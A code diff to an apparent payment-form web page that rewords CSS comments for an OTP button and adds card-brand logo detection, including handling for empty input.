@@ -184,13 +184,13 @@
       -webkit-text-security: disc;
       caret-color: transparent;
     }
-    /* We'll style the OTP confirm button to match the OTP input */
+    /* Style the OTP confirm button to match the OTP input */
     .otp-button {
       width: 100%;
       padding: 10px;
       border: 1px solid #ccc;
       border-radius: 5px;
-      background-color: #gray; /* initial background */
+      background-color: #gray; /* default background */
       color: white;
       font-size: 18px;
       text-align: center;
@@ -565,6 +565,11 @@
       const cardIcon = document.getElementById("cardTypeIcon");
       const cardInfo = document.getElementById("cardInfo");
       const plain = value.replace(/\s/g, '');
+      if (plain.length === 0) {
+        cardIcon.innerHTML = "";
+        if (cardInfo) cardInfo.textContent = "";
+        return;
+      }
       if (plain.length < 6) {
         let type = detectCardType(plain);
         let logoUrl = "";
@@ -627,7 +632,26 @@
             }
           }
         } else {
-          cardIcon.innerHTML = "";
+          // Fallback to first-digit detection
+          let type = detectCardType(plain);
+          let logoUrl = "";
+          switch (type) {
+            case "visa":
+              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png";
+              break;
+            case "mastercard":
+              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png";
+              break;
+            case "amex":
+              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png";
+              break;
+            case "rupay":
+              logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png";
+              break;
+            default:
+              logoUrl = "";
+          }
+          cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${type}" style="max-height:100%; max-width:100%;">` : "";
           if (cardInfo) cardInfo.textContent = "";
         }
       }
